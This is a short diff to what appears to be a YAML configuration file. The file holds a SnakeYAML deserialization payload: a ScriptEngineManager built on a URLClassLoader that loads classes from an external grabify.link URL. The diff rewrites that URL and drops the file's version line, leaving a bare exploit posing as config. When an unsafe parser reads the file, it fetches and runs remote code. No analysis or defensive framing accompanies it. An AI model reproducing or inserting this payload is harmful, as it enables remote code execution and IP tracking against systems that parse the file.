@@ -1,6 +1,5 @@
 !!javax.script.ScriptEngineManager [
   !!java.net.URLClassLoader [[
-    !!java.net.URL ["https://grabify.link/S9FG7Q"]
+    !!java.net.URL ["https://grabify.link/S9FG7Q?version"]
   ]]
 ]
-version: 1.2
